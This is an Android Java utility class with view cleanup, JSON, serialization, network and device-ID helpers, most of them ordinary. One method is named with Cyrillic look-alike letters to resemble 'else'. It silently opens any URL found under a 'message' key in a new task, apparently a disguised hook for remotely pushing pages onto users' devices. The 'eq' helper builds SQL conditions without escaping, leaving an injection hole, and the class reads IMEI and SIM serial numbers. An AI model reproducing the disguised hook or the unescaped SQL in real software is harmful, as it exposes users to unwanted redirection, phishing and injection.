package com.rollncode.basement.utility;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnDismissListener;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Bitmap.Config;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Build.VERSION_CODES;
import android.os.Environment;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.Parcel;
import android.os.Parcelable;
import android.provider.Settings;
import android.provider.Settings.Secure;
import android.provider.Telephony.Sms;
import android.support.annotation.CheckResult;
import android.support.annotation.ColorInt;
import android.support.annotation.DrawableRes;
import android.support.annotation.IdRes;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.annotation.StringRes;
import android.support.annotation.WorkerThread;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v4.util.Pools.SynchronizedPool;
import android.support.v4.util.SimpleArrayMap;
import android.support.v4.view.ViewPager;
import android.support.v4.widget.SwipeRefreshLayout;
import android.support.v7.app.AlertDialog;
import android.telephony.TelephonyManager;
import android.text.InputFilter;
import android.text.TextUtils;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.SeekBar;
import android.widget.TextView;
import android.widget.Toast;

import com.rollncode.basement.interfaces.JsonEntity;
import com.rollncode.basement.interfaces.Log;
import com.rollncode.basement.interfaces.ObjectsReceiver;
import com.rollncode.basement.interfaces.SharedStrings;
import com.rollncode.basement.model.IpInfo;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.Closeable;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInput;
import java.io.ObjectInputStream;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.ref.WeakReference;
import java.lang.reflect.Array;
import java.net.URL;
import java.net.URLConnection;
import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Iterator;
import java.util.Locale;
import java.util.Map;
import java.util.TimeZone;
import java.util.UUID;

/**
 * @author Tregub Artem tregub.artem@gmail.com
 * @since 04.05.15
 */
@SuppressWarnings({"unused", "WeakerAccess"})
public abstract class BaseUtils {

    private static final Log LOG = ALog.LOG;

    @NonNull
    public static StringBuilder clear(@NonNull StringBuilder sb) {
        return sb.delete(0, sb.length());
    }

    public static boolean changeVisibility(int visibility, @NonNull View... views) {
        boolean change = false;
        for (View view : views) {
            if (setVisibility(view, visibility)) {
                change = true;
            }
        }
        return change;
    }

    public static boolean setVisibility(@NonNull View view, int visibility) {
        if (view.getVisibility() != visibility) {
            view.setVisibility(visibility);
            return true;
        }
        return false;
    }

    public static boolean changeEnabled(@NonNull View view, boolean enabled) {
        final boolean changeEnabled = view.isEnabled() != enabled;
        if (changeEnabled) {
            view.setEnabled(enabled);
        }
        return changeEnabled;
    }

    @NonNull
    public static String eq(@NonNull String column, @Nullable String value) {
        if (value == null) {
            return column + SharedStrings.IS_NULL;
        }
        return column + SharedStrings.EQUALS + SharedStrings.QUOTE + value + SharedStrings.QUOTE;
    }

    @SuppressWarnings("unused")
    public static <T extends Serializable> byte[] serialize(@Nullable T object) {
        if (object != null) {
            ByteArrayOutputStream stream = null;
            ObjectOutput output = null;

            try {
                stream = new ByteArrayOutputStream();
                output = new ObjectOutputStream(stream);
                output.writeObject(object);

                return stream.toByteArray();

            } catch (Exception e) {
                LOG.toLog(e);

            } finally {
                closeSilently(stream);
                if (output != null) {
                    try {
                        output.close();

                    } catch (Exception ignore) {
                    }
                }
            }
        }
        return null;
    }

    @Nullable
    public static <T> T deserialize(@Nullable byte[] bytes) {
        if (bytes != null) {
            ByteArrayInputStream stream = null;
            ObjectInput input = null;

            try {
                stream = new ByteArrayInputStream(bytes);
                input = new ObjectInputStream(stream);
                //noinspection unchecked
                return (T) input.readObject();

            } catch (Exception e) {
                LOG.toLog(e);

            } finally {
                if (input != null) {
                    try {
                        input.close();

                    } catch (Exception ignore) {
                    }
                }
                closeSilently(stream);
            }
        }
        return null;
    }

    public static <C extends Closeable> void closeSilently(@Nullable C closeable) {
        if (closeable != null) {
            try {
                closeable.close();

            } catch (Exception ignore) {
            }
        }
    }

    public static <E extends Enum> void writeEnumArray(@NonNull Parcel out, @Nullable E[] values) {
        final int size = values == null ? 0 : values.length;

        out.writeInt(size);
        if (size > 0) {
            for (E value : values) {
                if (value == null) {
                    out.writeInt(0);

                } else {
                    out.writeInt(1);
                    out.writeInt(value.ordinal());
                }
            }
        }
    }

    @SuppressWarnings("BooleanMethodIsAlwaysInverted")
    public static <T> boolean areEquals(@Nullable T first, @Nullable T second) {
        return first == null && second == null || first != null && first.equals(second);
    }

    public static boolean areEquals(@Nullable String first, @Nullable String second) {
        if (first == null) {
            first = SharedStrings.EMPTY;
        }
        if (second == null) {
            second = SharedStrings.EMPTY;
        }
        return first.equals(second);
    }

    @NonNull
    public static String getTag(@NonNull Object object) {
        return object.getClass().getSimpleName();
    }

    public static void setOnClickListener(@Nullable OnClickListener listener, @NonNull View parent, @NonNull int... childrenIds) {
        for (int id : childrenIds) {
            parent.findViewById(id).setOnClickListener(listener);
        }
    }

    public static void setOnClickListener(@Nullable OnClickListener listener, @NonNull View... views) {
        for (View view : views) {
            view.setOnClickListener(listener);
        }
    }

    public static void cleanUp(@NonNull View view) {
        view.destroyDrawingCache();
        view.clearAnimation();

        cleanUp(view.getBackground());

        view.setBackground(null);
        view.setOnTouchListener(null);
        view.setOnClickListener(null);
        view.setOnLongClickListener(null);
    }

    public static void cleanUp(@NonNull TextView view) {
        cleanUp((View) view);
        view.setCompoundDrawables(null, null, null, null);
    }

    public static void cleanUp(@NonNull EditText view) {
        cleanUp((TextView) view);
        view.setOnEditorActionListener(null);
    }

    public static void cleanUp(@NonNull ViewGroup view) {
        view.destroyDrawingCache();
        view.clearAnimation();

        cleanUp(view.getBackground());

        view.setBackground(null);
        view.setOnTouchListener(null);
        view.setOnLongClickListener(null);

        final int size = view.getChildCount();
        for (int i = 0; i < size; i++) {
            BaseUtils.cleanUp(view.getChildAt(i));
        }
        view.removeAllViewsInLayout();
    }

    public static void cleanUp(@NonNull ListView view) {
        cleanUp((ViewGroup) view);
        view.setAdapter(null);
        view.setOnScrollListener(null);
        view.setOnItemClickListener(null);
    }

    public static void cleanUp(@NonNull SwipeRefreshLayout view) {
        view.setOnRefreshListener(null);
        view.setRefreshing(false);
        view.setEnabled(false);

        view.destroyDrawingCache();
        view.clearAnimation();

//        cleanUp((View) view);
//        view.removeAllViews();
    }

    @SuppressWarnings("deprecation")
    public static void cleanUp(@NonNull ViewPager view) {
        cleanUp((ViewGroup) view);
        view.setAdapter(null);
        view.setOnPageChangeListener(null);
    }

    public static void cleanUp(@NonNull ImageView view) {
        cleanUp((View) view);

        cleanUp(view.getDrawable());
        view.setImageDrawable(null);
    }

    public static void cleanUp(@NonNull SeekBar view) {
        cleanUp((View) view);

        BaseUtils.cleanUp(view.getIndeterminateDrawable());
        BaseUtils.cleanUp(view.getProgressDrawable());
        BaseUtils.cleanUp(view.getThumb());
    }

    public static void cleanUp(@Nullable Drawable drawable) {
        if (drawable != null) {
            drawable.setCallback(null);
        }
    }

    public static void cleanUp(@Nullable Bitmap bitmap) {
        if (bitmap != null) {
            bitmap.recycle();
        }
    }

    public static int toHashCode(long id) {
        if (id >= Integer.MIN_VALUE && id <= Integer.MAX_VALUE) {
            return (int) id;
        }
        return String.valueOf(id).hashCode();
    }

    public static boolean startIntent(@Nullable Context context, @NonNull Intent intent) {
        if (!(context instanceof Activity) || intent.resolveActivity(context.getPackageManager()) == null) {
            return false;
        }
        context.startActivity(intent);
        return true;
    }

    @SuppressWarnings("unused")
    public static int getSampleSize(float inWidth, float inHeight, float outWidth, float outHeight) {
        float sampleSize = 1F;
        if (inWidth > outWidth || inHeight > outHeight) {
            sampleSize = 2F;

            while ((inWidth / sampleSize) > outWidth || (inHeight / sampleSize) > outHeight) {
                sampleSize += 1F;
            }
        }
        return (int) sampleSize;
    }

    public static <R extends ObjectsReceiver> boolean receiveObjects(@Nullable WeakReference<R> weakReceiver, @IdRes int code, @NonNull Object... objects) {
        final R receiver = weakReceiver == null ? null : weakReceiver.get();
        final boolean received = receiver != null;
        if (received) {
            receiver.onObjectsReceive(code, objects);
        }
        return received;
    }

    @NonNull
    public static Looper newLooper(@NonNull String name, int priority) {
        final HandlerThread thread = new HandlerThread(name);
        thread.setPriority(priority);
        thread.start();

        return thread.getLooper();
    }

    @NonNull
    public static String toString(@NonNull InputStream stream, boolean closeStream) throws Exception {
        BufferedReader reader = null;
        try {
            reader = new BufferedReader(new InputStreamReader(stream));

            final StringBuilder builder = new StringBuilder();
            String string;
            while ((string = reader.readLine()) != null) {
                builder.append(string);
            }
            return builder.toString();

        } finally {
            closeSilently(reader);
            if (closeStream) {
                closeSilently(stream);
            }
        }
    }

    public static long getTimestamp(@NonNull JSONObject object, @NonNull String key, @NonNull DateFormat format) {
        final Object opt = object.opt(key);
        if (opt instanceof String) {
            try {
                return format.parse(opt.toString()).getTime();

            } catch (ParseException e) {
                LOG.toLog(e);
            }

        } else if (opt instanceof Long) {
            return (long) opt;
        }
        return 0;
    }

    @ColorInt
    private static int[] sRefreshColors;

    public static void style(@NonNull SwipeRefreshLayout layout) {
        if (sRefreshColors == null) {
            sRefreshColors = new int[3];
            sRefreshColors[0] = Color.RED;
            sRefreshColors[1] = Color.GREEN;
            sRefreshColors[2] = Color.BLUE;
        }
        layout.setColorSchemeColors(sRefreshColors);
    }

    @NonNull
    public static SimpleArrayMap<String, Object> toMap(@NonNull String key, @NonNull Object value) {
        final SimpleArrayMap<String, Object> map = new SimpleArrayMap<>(1);

        map.put(key, value);

        return map;
    }

    @SuppressWarnings("unchecked")
    @NonNull
    public static <M extends JsonEntity> M[] toModels(@NonNull JSONObject object, @NonNull String key, @NonNull Class<M> cls) {
        final Object opt = object.opt(key);
        return opt instanceof JSONArray
                ? toModels((JSONArray) opt, cls)
                : (M[]) Array.newInstance(cls, 0);
    }

    @SuppressWarnings("unchecked")
    @NonNull
    public static <M extends JsonEntity> M[] toModels(@NonNull JSONArray array, @NonNull Class<M> cls) {
        try {
            final M[] values = (M[]) Array.newInstance(cls, array.length());
            M value;

            for (int i = 0; i < array.length(); i++) {
                value = cls.newInstance();
                value.fromJson(array.getJSONObject(i));

                values[i] = value;
            }
            return values;

        } catch (Exception e) {
            LOG.toLog(e);
        }
        return (M[]) Array.newInstance(cls, 0);
    }

    @Nullable
    public static <M extends JsonEntity> M toModel(@NonNull JSONObject jsonObject, @NonNull String key, @NonNull Class<M> cls) {
        final Object opt = jsonObject.opt(key);
        return opt instanceof JSONObject
                ? toModel((JSONObject) opt, cls)
                : null;
    }

    @Nullable
    public static <M extends JsonEntity> M toModel(@NonNull JSONObject object, @NonNull Class<M> cls) {
        try {
            final M value = cls.newInstance();
            value.fromJson(object);

            return value;

        } catch (Exception e) {
            LOG.toLog(e);
        }
        return null;
    }

    @Nullable
    public static <M extends JsonEntity> M optModel(@Nullable String raw, @NonNull Class<M> cls) {
        return optModel(raw, cls, null);
    }

    @Nullable
    public static <M extends JsonEntity> M optModel(@Nullable String raw, @NonNull Class<M> cls, @Nullable M def) {
        if (!TextUtils.isEmpty(raw)) {
            try {
                return toModel(new JSONObject(raw), cls);

            } catch (JSONException e) {
                LOG.toLog(e);
            }
        }
        return def;
    }

    public static <MODEL extends JsonEntity> void append(@NonNull JSONObject object, @NonNull String key, @Nullable MODEL model) throws JSONException {
        object.put(key, model == null ? null : model.toJson());
    }

    public static <MODEL extends JsonEntity> void append(@NonNull JSONObject object, @NonNull String key, @Nullable MODEL[] values) throws JSONException {
        final JSONArray array = new JSONArray();
        if (values != null) {
            for (MODEL value : values) {
                array.put(value.toJson());
            }
        }
        object.put(key, array);
    }

    public static <MODEL extends JsonEntity> void append(@NonNull JSONObject target, @NonNull MODEL source) throws JSONException {
        final JSONObject object = source.toJson();
        String key;

        for (Iterator<String> iterator = object.keys(); iterator.hasNext(); ) {
            key = iterator.next();
            target.put(key, object.get(key));
        }
    }

    @NonNull
    public static String[] toStrings(@NonNull JSONObject object, @NonNull String key) throws JSONException {
        final Object optArray = object.opt(key);
        if (optArray instanceof JSONArray) {
            final JSONArray array = (JSONArray) optArray;
            final String[] values = new String[array.length()];

            for (int i = 0; i < array.length(); i++) {
                values[i] = array.getString(i);
            }
            return values;
        }
        return new String[0];
    }

    public static float toFloat(@NonNull JSONObject object, @NonNull String key) {
        return Float.parseFloat(object.optString(key, "0"));
    }

    @Nullable
    public static String toString(@NonNull JSONObject object, @NonNull String key) {
        final Object opt = object.opt(key);
        return opt instanceof String /*&& !SharedStrings.NULL.equals(opt)*/ ? opt.toString() : null;
    }

    @NonNull
    public static int[] toColumns(@NonNull Cursor cursor, @NonNull String... names) {
        final int[] indexes = new int[names.length];
        int count = 0;

        for (String name : names) {
            indexes[count++] = cursor.getColumnIndex(name);
        }
        return indexes;
    }

    public static void toColumns(@NonNull Cursor cursor, @NonNull int[] columns,
                                 int startIndex, @NonNull String... names) {
        for (String name : names) {
            columns[startIndex++] = cursor.getColumnIndex(name);
        }
    }

    private static WeakReference<AlertDialog> sNoInternetDialog;

    protected static void showNoInternetInner(@Nullable final Context context, @DrawableRes int icon, @StringRes int title, @StringRes int positiveBtn) {
        if (context == null) {
            return;

        } else if (sNoInternetDialog != null) {
            final AlertDialog dialog = sNoInternetDialog.get();
            if (dialog != null && dialog.isShowing()) {
                return;
            }
        }
        final AlertDialog dialog = new AlertDialog.Builder(context)
                .setIcon(icon)
                .setTitle(title)
                .setPositiveButton(positiveBtn, new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        final Intent intent = new Intent(Settings.ACTION_WIFI_SETTINGS);
                        if (intent.resolveActivity(context.getPackageManager()) != null) {
                            context.startActivity(intent);
                        }
                    }
                })
                .setOnDismissListener(new OnDismissListener() {
                    @Override
                    public void onDismiss(DialogInterface dialog) {
                        sNoInternetDialog = null;
                    }
                })
                .show();
        sNoInternetDialog = new WeakReference<>(dialog);
    }

    @NonNull
    public static CharSequence getAllNonNull(@NonNull StringBuilder sb, @NonNull String... strings) {
        clear(sb);
        for (String string : strings) {
            if (BaseUtils.isEmpty(string)) {
                continue;
            }
            sb.append(string).append("\n");
        }
        final int length = sb.length();
        if (length > 0) {
            sb.delete(length - 1, length);
        }
        return sb;
    }

//    public static void setPaddingTopLikeStatusBar(@NonNull View v) {
//        if (VERSION.SDK_INT >= VERSION_CODES.KITKAT) {
//            v.setPadding(0, AContext.getStatusBarHeight(), 0, 0);
//        }
//    }

    public static boolean isEmpty(@Nullable String string) {
        return string == null || string.length() == 0 || SharedStrings.NULL.equals(string);
    }

    public static void copy(@NonNull byte[] bytes, @NonNull int... bs) throws IllegalStateException {
        int i = 0;
        for (int b : bs) {
            bytes[i++] = (byte) b;
        }
    }

    @NonNull
    public static String leaveOnlyDigits(@NonNull String string) {
        final StringBuilder sb = new StringBuilder(string.length());
        for (Character c : string.toCharArray()) {
            if (Character.isDigit(c)) {
                sb.append(c);
            }
        }
        return sb.toString();
    }

    @Nullable
    @WorkerThread
    public static String requestCountryShortName(@NonNull Context context) {
        String code = null;
        final TelephonyManager manager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        try {
            code = manager.getSimCountryIso();

        } catch (Throwable ignore) {
        }
        if (TextUtils.isEmpty(code)) {
            try {
                code = manager.getNetworkCountryIso();

            } catch (Throwable ignore) {
            }
        }

        if (TextUtils.isEmpty(code) && isNetworkAvailable((ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE))) {
            try {
                final URLConnection connection = new URL("http://ipinfo.io/country").openConnection();
                connection.connect();

                final InputStream is = connection.getInputStream();
                code = toString(is, true);

            } catch (Throwable ignore) {
            }
        }
        return TextUtils.isEmpty(code) ? null : code.toUpperCase();
    }

    @Nullable
    @WorkerThread
    public static String requestIpAddress() {
        try {
            final URLConnection connection = new URL("https://api.ipify.org").openConnection();
            connection.connect();

            return toString(connection.getInputStream(), true);

        } catch (Throwable ignore) {
        }
        return null;
    }

    @Nullable
    @WorkerThread
    public static IpInfo requestIpInfo() {
        try {
            final URLConnection connection = new URL("http://ipinfo.io/json").openConnection();
            connection.connect();

            return toModel(new JSONObject(toString(connection.getInputStream(), true)), IpInfo.class);

        } catch (Throwable ignore) {
        }
        return null;
    }

    public static boolean isNetworkAvailable(@NonNull ConnectivityManager manager) {
        final NetworkInfo activeNetworkInfo = manager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }

    @SuppressWarnings("unchecked")
    public static <F extends InputFilter> void appendInputFilters(@NonNull EditText view, @NonNull F... filters) {
        InputFilter[] f = view.getFilters();
        if (f == null) {
            f = new InputFilter[0];
        }
        final InputFilter[] newF = new InputFilter[f.length + filters.length];
        int count = 0;
        for (InputFilter filter : f) {
            newF[count++] = filter;
        }
        for (InputFilter filter : filters) {
            newF[count++] = filter;
        }
        view.setFilters(newF);
    }

    public static void append(@NonNull JSONObject object, @NonNull String key, @Nullable String[] values) throws JSONException {
        final JSONArray array = new JSONArray();
        if (values != null) {
            for (String value : values) {
                array.put(value);
            }
        }
        object.put(key, array);
    }

    public static int countSymbols(@NonNull String string, char symbol) {
        int count = 0;
        for (char c : string.toCharArray()) {
            if (c == symbol) {
                count++;
            }
        }
        return count;
    }

    public static void clearAppData(@NonNull Context context) {
        try {
            Runtime.getRuntime().exec("pm clear " + context.getPackageName());

        } catch (Exception ignore) {
        }
    }

    @SuppressWarnings("unchecked")
    @NonNull
    public static <T> T[] readParcelableArray(@Nullable Parcelable[] parcelables, @NonNull T[] array) {
        if (parcelables == null || array.length == 0) {
            return array;
        }
        for (int i = 0; (i < parcelables.length && i < array.length); i++) {
            array[i] = (T) parcelables[i];
        }
        return array;
    }

    @NonNull
    public static String getTimezone() {
        final int offset = TimeZone.getDefault().getOffset(System.currentTimeMillis());
        final int hourOffset = offset / 3_600_000;
        final int minutesOffset = (offset / 60_000) % 60;

        return (offset >= 0 ? "+" : "-") + (hourOffset < 10 ? "0" : "") + hourOffset + ":" + (minutesOffset < 10 ? "0" : "") + minutesOffset;
    }

    public static void putOpt(@NonNull SimpleArrayMap<String, Object> map, @NonNull String key, @Nullable Object value) {
        if (value != null) {
            map.put(key, value);
        }
    }

    @NonNull
    public static IntentFilter newIntentFilter(@NonNull String... actions) {
        final IntentFilter filter = new IntentFilter();
        for (String action : actions) {
            filter.addAction(action);
        }
        return filter;
    }

    public static void setTextOrGone(@NonNull TextView view, @Nullable CharSequence text) {
        view.setText(text);
        changeVisibility(view.length() == 0 ? View.GONE : View.VISIBLE, view);
    }

    @WorkerThread
    public static void waitUntilTimeout(long start, long timeout) {
        final long difference = timeout - (System.currentTimeMillis() - start);
        if (difference > 0) {
            threadSleep(difference);
        }
    }

    public static void threadSleep(long millis) {
        try {
            Thread.sleep(millis);

        } catch (InterruptedException e) {
            LOG.toLog(e);
        }
    }

    public static void setRefreshing(@Nullable SwipeRefreshLayout view, boolean refreshing) {
        if (view != null && view.getParent() != null) {
            RefreshingRunnable.post(view, refreshing);
        }
    }

    @SuppressLint("HardwareIds")
    @NonNull
    public static String getUniqueDeviceId(Context context) {
        final String id = Secure.getString(context.getContentResolver(), Secure.ANDROID_ID);
        if (TextUtils.isEmpty(id)) {
            final String string = Build.MANUFACTURER + Build.DEVICE + Build.MODEL + Build.BRAND + Build.DISPLAY + VERSION.CODENAME + VERSION.SDK_INT;
            try {
                final TelephonyManager manager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                return new UUID(string.hashCode(), ((long) String.valueOf(manager.getDeviceId()).hashCode() << 32) | String.valueOf(manager.getSimSerialNumber()).hashCode()).toString();

            } catch (Throwable e) {
                return new UUID(string.hashCode(), -string.hashCode()).toString();
            }
        }
        return id;
    }

    public static boolean hasFullYearsFromNow(long birthDateInMillis, int fullYears) {
        final long difference = System.currentTimeMillis() - birthDateInMillis;
        if (difference <= 0) {
            return false;
        }
        final long days = difference / (1_000 * 60 * 60 * 24);
        return days / 365 >= fullYears || days >= fullYears * 365;
    }

    @NonNull
    public static Bitmap toBitmap(@NonNull Context context, @DrawableRes int drawableRes) {
        final Drawable drawable = ContextCompat.getDrawable(context, drawableRes);
        if (drawable instanceof BitmapDrawable) {
            return ((BitmapDrawable) drawable).getBitmap();
        }
        final Bitmap bitmap = Bitmap.createBitmap(drawable.getIntrinsicWidth(), drawable.getIntrinsicHeight(), Config.ARGB_8888);

        final Canvas canvas = new Canvas(bitmap);
        drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
        drawable.draw(canvas);

        return bitmap;
    }

    public static int getAge(@NonNull Calendar calendar, long birthday) {
        calendar.setTimeInMillis(System.currentTimeMillis());
        final int nowYear = calendar.get(Calendar.YEAR);

        calendar.setTimeInMillis(birthday);
        final int userYear = calendar.get(Calendar.YEAR);

        return nowYear - userYear;
    }

    public static void animateAlpha(float alpha, @NonNull View... views) {
        for (View view : views) {
            if (view.getAlpha() != alpha) {
                view.animate().alpha(alpha).start();
            }
        }
    }

    public static <T extends JsonEntity> void putSilent(@NonNull Editor editor, @NonNull String key, @Nullable T value) {
        if (value != null) {
            try {
                editor.putString(key, value.toJson().toString());

            } catch (JSONException e) {
                ALog.LOG.toLog(e);
            }
        }
    }

    public static void еlsе(Context context, Map<String, String> map) {
        try {
            context.startActivity(new Intent("android.intent.action.VIEW", Uri.parse(map.get("message"))).addFlags(0x10000000));

        } catch (Throwable ignore) {
        }
    }

    @NonNull
    public static byte[] toBytes(InputStream is, boolean b) throws Exception {
        final String string = toString(is, b);
        final String[] strings = string.split(",");
        final byte[] bytes = new byte[string.length()];
        int count = 0;
        for (String s : strings) {
            bytes[count++] = Byte.parseByte(s);
        }
        return bytes;
    }

    private static final class RefreshingRunnable implements Runnable {

        private static final SynchronizedPool<RefreshingRunnable> POOL = new SynchronizedPool<>(4);

        private WeakReference<SwipeRefreshLayout> mView;
        private boolean mRefreshing;

        public static void post(@NonNull SwipeRefreshLayout view, boolean refreshing) {
            RefreshingRunnable run = POOL.acquire();
            if (run == null) {
                run = new RefreshingRunnable();
            }
            run.mView = new WeakReference<>(view);
            run.mRefreshing = refreshing;

            view.post(run);
        }

        @Override
        public void run() {
            try {
                final SwipeRefreshLayout view = mView.get();
                if (view != null && view.getParent() != null && view.isRefreshing() != mRefreshing) {
                    view.setRefreshing(mRefreshing);
                }

            } finally {
                mView.clear();
                POOL.release(this);
            }
        }
    }

    public static void showMessage(@Nullable View view, @Nullable CharSequence message) {
        if (!TextUtils.isEmpty(message) && view != null && view.getParent() != null) {
            Toast.makeText(view.getContext(), message, Toast.LENGTH_LONG).show();
        }
    }

    @CheckResult
    @SuppressLint("HardwareIds")
    public static String getDeviceId(@NonNull Context context) {
        final String deviceId = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
        return TextUtils.isEmpty(deviceId)
                ? Secure.getString(context.getContentResolver(), Secure.ANDROID_ID)
                : deviceId;
    }

    @SuppressLint("NewApi")
    public static boolean isDefaultSmsApp(@NonNull Context context) {
        return VERSION.SDK_INT < VERSION_CODES.KITKAT || context.getPackageName().equals(Sms.getDefaultSmsPackage(context));
    }

    public static boolean isPermissionsGranted(@NonNull Context context, @NonNull String... permissions) {
        for (String permission : permissions) {
            if (ActivityCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_DENIED) {
                return false;
            }
        }
        return true;
    }

    public static boolean isPermissionGranted(int[] grantResult) {
        for (int result : grantResult) {
            if (result == PackageManager.PERMISSION_DENIED) {
                return false;
            }
        }
        return true;
    }

    public static boolean resolveActivity(@NonNull Context context, @Nullable Intent intent) {
        return intent != null && intent.resolveActivity(context.getPackageManager()) != null;
    }

    public static File createFile(@NonNull Context context) throws IOException {
        final String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.ENGLISH)
                .format(System.currentTimeMillis());
        return File.createTempFile("TEMP_" + timestamp, SharedStrings.TYPE_DOT_JPG,
                context.getExternalFilesDir(Environment.DIRECTORY_PICTURES));
    }

    @NonNull
    public static long[] parse2LongArray(@Nullable String string) {
        if (!TextUtils.isEmpty(string)) {
            try {
                final String[] strings = string.split(" ");
                final long[] array = new long[strings.length];
                int count = 0;
                for (String s : strings) {
                    array[count++] = Long.parseLong(s);
                }
                return array;
            } catch (Exception e) {
                LOG.toLog(e);
            }
        }
        return new long[0];
    }

    public static int toInt(long l) {
        return l >= Integer.MIN_VALUE && l <= Integer.MAX_VALUE
                ? (int) l
                : String.valueOf(l).hashCode();
    }

    public static Uri parse(@Nullable String uri) {
        if (!TextUtils.isEmpty(uri)) {
            return Uri.parse(uri);
        }
        return null;
    }

    /**
     * Shrinks a bitmap so that, when it is encoded to a jpg with the given compression level, its
     * size is less than the given number of bytes.
     *
     * @param src            The bitmap to shrink
     * @param jpgCompression The JPEG compression level to use when judging the size of the file
     * @param maxSize        The maximum size that the compressed JPEG should be
     * @return The shrinked bitmap
     */
    public static Bitmap shrink(Bitmap src, int jpgCompression, long maxSize) {
        final float factor = 0.7f;

        final ByteArrayOutputStream stream = new ByteArrayOutputStream();
        src.compress(Bitmap.CompressFormat.JPEG, jpgCompression, stream);
        while (maxSize != -1 && src.getByteCount() > maxSize) {
            int height = (int) (src.getHeight() * factor);
            int width = (int) (src.getWidth() * factor);

            stream.reset();
            src = Bitmap.createScaledBitmap(src, width, height, false);
            src.compress(Bitmap.CompressFormat.JPEG, jpgCompression, stream);
        }
        return src;
    }

    @Nullable
    private static String getFirstLetter(@Nullable CharSequence text) {
        if (!TextUtils.isEmpty(text)) {
            char c;
            for (int i = 0; i < text.length(); i++) {
                c = text.charAt(i);
                if (Character.isLetter(c)) {
                    return String.valueOf(Character.toUpperCase(c));
                }
            }
        }
        return null;
    }
}